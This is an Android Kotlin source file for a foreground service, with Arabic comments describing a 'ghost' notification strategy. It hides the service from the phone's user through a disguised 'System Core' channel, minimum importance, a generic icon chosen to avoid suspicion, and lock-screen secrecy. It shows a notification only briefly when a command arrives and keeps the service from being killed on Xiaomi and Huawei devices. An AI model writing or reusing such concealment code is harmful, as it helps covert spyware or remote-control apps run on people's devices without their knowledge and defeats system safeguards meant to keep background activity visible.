package com.example.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" ديناميكي.
 *
 * استراتيجية التخفي المتقدمة (Dynamic Pulse Ghost):
 * - الإشعار الأساسي بأولوية IMPORTANCE_MIN (مخفي تماماً في شريط الحالة)
 * - عند استلام أمر PULSE_ACTION، يتم ترقية الإشعار مؤقتاً إلى IMPORTANCE_LOW
 *   لمدة 1.5 ثانية ثم يعود للحالة الشبحية
 * - setOngoing(true) يبقى مفعلاً طوال الوقت لمنع قتل الخدمة
 * - أيقونة نظامية عامة (ic_menu_compass) لتجنب الشك
 * - إخفاء المحتوى من شاشة القفل
 *
 * ✅ هذه الاستراتيجية تمنع قتل الخدمة في أجهزة شاومي وهواوي
 * ✅ مع الحفاظ على التخفي المطلق من وجهة نظر المستخدم
 */
class ForegroundService : Service() {

    companion object {
        private const val TAG = "ForegroundService"
        const val NOTIFICATION_ID = 9991
        private const val GHOST_CHANNEL_ID = "ghost_system_channel"
    }

    private var isForeground = false
    private lateinit var notificationManager: NotificationManager

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // إيقاف الخدمة إذا طُلب ذلك
        if (intent?.action == "STOP_SERVICE") {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // ✅ آلية النبض الديناميكي للإشعار
        if (!isForeground) {
            // البدء بوضع الشبح المطلق (غير مرئي تقريباً)
            startGhostForeground(isPulse = false)
        } else if (intent?.action == "PULSE_ACTION") {
            // ✅ ترقية مؤقتة للإشعار ليظهر عند تنفيذ أمر، ثم يعود للشبحية
            startGhostForeground(isPulse = true)
            Handler(Looper.getMainLooper()).postDelayed({
                startGhostForeground(isPulse = false)
            }, 1500) // يظهر لمدة 1.5 ثانية ثم يختفي تماماً من الواجهة
        }

        return START_STICKY
    }

    /**
     * بدء الخدمة كـ Foreground مع إشعار ديناميكي.
     * 
     * @param isPulse true = إشعار مرئي مؤقتاً، false = إشعار شبح مخفي
     */
    private fun startGhostForeground(isPulse: Boolean) {
        val channelId = GHOST_CHANNEL_ID
        // في وضع الشبح: IMPORTANCE_MIN (مخفي تماماً)
        // في وضع النبض: IMPORTANCE_LOW (يظهر لحظياً دون إزعاج)
        val importance = if (isPulse) NotificationManager.IMPORTANCE_LOW else NotificationManager.IMPORTANCE_MIN

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Core",
                importance
            ).apply {
                description = "Background system operations"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                if (!isPulse) {
                    // إخفاء كامل من شريط الإشعارات في وضع السكون
                    setBypassDnd(false)
                }
            }
            notificationManager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle(if (isPulse) "System Syncing..." else "System")
            .setContentText(if (isPulse) "Processing secure task" else "")
            .setSmallIcon(if (isPulse) android.R.drawable.ic_popup_sync else android.R.drawable.ic_menu_compass)
            .setPriority(if (isPulse) NotificationCompat.PRIORITY_LOW else NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setOngoing(true) // ✅ ضروري لمنع قتل الخدمة بواسطة النظام
            .setSilent(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
        isForeground = true
        Log.d(TAG, "Ghost foreground started (isPulse=$isPulse)")
    }

    override fun onDestroy() {
        isForeground = false
        Log.d(TAG, "ForegroundService destroyed")
        super.onDestroy()
    }
}
